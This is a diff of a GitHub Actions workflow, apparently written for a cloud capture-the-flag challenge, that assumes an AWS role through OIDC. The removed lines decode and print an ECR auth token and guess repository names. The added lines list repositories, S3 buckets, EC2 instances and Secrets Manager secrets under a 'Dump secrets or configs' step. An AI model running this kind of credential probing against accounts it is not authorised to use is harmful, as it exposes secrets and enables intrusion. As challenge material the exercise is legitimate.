@@ -1,71 +1,31 @@
-name: Decode and Use ECR Token
-on: [push]
+# .github/workflows/aws-access.yml
+name: AWS OIDC Access
+
+on:
+  workflow_dispatch:
 
 jobs:
   assume-role:
     runs-on: ubuntu-latest
     permissions:
-      id-token: write
+      id-token: write   # Required for OIDC
       contents: read
+
     steps:
-      - name: Configure AWS Credentials
+      - name: Configure AWS credentials via OIDC
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
-          
-      - name: Get and Decode ECR Auth Token
-        run: |
-          echo "=== Getting ECR Authorization Token ==="
-          # Get the auth token properly
-          AUTH_DATA=$(aws ecr get-authorization-token --output json)
-          echo "Raw auth data: $AUTH_DATA"
-          
-          # Extract the token
-          AUTH_TOKEN=$(echo $AUTH_DATA | jq -r '.authorizationData[0].authorizationToken')
-          echo "Auth token: $AUTH_TOKEN"
-          
-          # Extract the proxy endpoint
-          PROXY_ENDPOINT=$(echo $AUTH_DATA | jq -r '.authorizationData[0].proxyEndpoint')
-          echo "Proxy endpoint: $PROXY_ENDPOINT"
-          
-          # Decode the base64 token
-          echo "=== Decoded token ==="
-          echo $AUTH_TOKEN | base64 -d
-          echo
-          
-      - name: Try Direct ECR Login and Search
-        run: |
-          # Get auth token and login properly
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
-          
-          echo "=== Trying to discover repositories ==="
-          # Even if we can't list, try to pull common images directly
-          REPOS=(
-            "imaginary"
-            "challenge" 
-            "ctf"
-            "flag"
-            "app"
-            "test"
-            "demo"
-          )
-          
-          for repo in "${REPOS[@]}"; do
-            echo "Trying: $repo"
-            # Try to pull latest tag
-            docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest 2>/dev/null && echo "✅ SUCCESS: Found $repo" || echo "❌ Not found: $repo"
-          done
 
-      - name: Check for Any Accessible Resources
+      - name: Check AWS Identity
+        run: aws sts get-caller-identity
+
+      - name: List ECR Repositories
+        run: aws ecr describe-repositories
+
+      - name: Dump secrets or configs
         run: |
-          echo "=== Checking for other accessible AWS resources ==="
-          
-          # Try to describe any resources we might have access to
-          aws ecr describe-registry --region us-east-1 || echo "No registry describe access"
-          
-          # Try to get repository policy if any repo exists
-          aws ecr get-repository-policy --repository-name imaginary --region us-east-1 2>/dev/null && echo "✅ Has repository policy access"
-          
-          # Check if we can access any specific image by digest
-          aws ecr describe-images --repository-name imaginary --region us-east-1 2>/dev/null && echo "✅ Can describe images in 'imaginary'"
+          aws s3 ls
+          aws ec2 describe-instances
+          aws secretsmanager list-secrets
